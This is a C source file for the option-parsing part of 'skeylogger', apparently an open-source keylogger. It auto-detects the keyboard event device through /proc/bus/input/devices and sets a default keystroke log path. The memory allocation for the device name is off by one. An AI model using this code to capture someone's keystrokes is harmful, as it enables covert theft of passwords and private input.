#include <getopt.h>
#include <stdio.h>
#include <stdlib.h> // exit
#include <string.h>
#include <fcntl.h>  // open
#include <unistd.h> // read

#include "options.h"
#include "util.h"

#define VERSION "0.0.1"

static void printHelp();
static void printVersion();
static char *getKeyboardDeviceFileName();

static const char short_opts[] = "hvl:d:";
static struct option long_opts[] = {
   {"help",    no_argument,         0, 'h'},
   {"version", no_argument,         0, 'v'},
   {"logfile", required_argument,   0, 'l'},
   {"device",  required_argument,   0, 'd'},
   {0, 0, 0, 0}
};

/**
 * Detects and returns the name of the keyboard device file. This function uses
 * the fact that all device information is shown in /proc/bus/input/devices and
 * the keyboard device file should always have an EV of 120013
 *
 * @return the name of the keyboard device file
 */
static char *getKeyboardDeviceFileName() {
  int rd;
  char *devName = malloc(strlen("/dev/input/eventXXX"));
  const char *pdevsName = "/proc/bus/input/devices";

  int devsFile = open(pdevsName, O_RDONLY);
  if (devsFile == -1) {
    printf("[ERR] Open input devices file: '%s' is FAILED\n", pdevsName);
  } else {
    char devs[4096];

    if ((rd = read(devsFile, devs, sizeof(devs) - 1)) < 6) {
      printf("[ERR] Wrong size was read from devs file\n");
    } else {
      devs[rd] = 0;

      char *pHandlers, *pEV = devs;
      do {
        pHandlers = strstr(pEV, "Handlers=");
        pEV = strstr(pHandlers, "EV=");
      } while (pHandlers && pEV && 0 != strncmp(pEV + 3, "120013", 6));

      if (pHandlers && pEV) {
        char *pevent = strstr(pHandlers, "event");
	strcpy(devName, "/dev/input/event");

        if (pevent) {
	  devName[16] = pevent[5];
	  if (pevent[6] >= '0' && pevent[6] <= '9') {
	    devName[17] = pevent[6];
	    devName[18] = '\0';
	  } else devName[17] = '\0';
        } else {
          printf("[ERR] Abnormal keyboard event device\n");
        }
      } else {
        printf("[ERR] Keyboard event device not found\n");
      }
    }
  }
  return devName;
}

void parseOptions(int argc, char **argv, Config *config) {
   config->deviceFile = getKeyboardDeviceFileName();
   config->logFile = "/var/log/skeylogger.log";

   int index;
   int opt = 0;
   while (opt != -1) {
      opt = getopt_long(argc, argv, short_opts, long_opts, &index);

      switch (opt) {
      case 'h':
         printHelp();
         exit(0);
         break;
      case 'v':
         printVersion();
         exit(0);
         break;
      case 'l':
         config->logFile = strdup(optarg);
         break;
      case 'd':
         config->deviceFile = strdup(optarg);
         break;
      case '?':
         // Errors handled automatically
         break;
      }
   }
}

static void printHelp() {
   printf("%s\n", "Usage: skeylogger [OPTION]\n"
          "Logs pressed keys\n\n"
          "  -h, --help\t\tDisplays this help message\n"
          "  -v, --version\t\tDisplays version information\n"
          "  -l, --logfile\t\tPath to the logfile\n"
          "  -d, --device\t\tPath to device file (/dev/input/eventX)\n");
}

static void printVersion() {
   printf("%s\n", "Simple Key Logger version " VERSION);
}
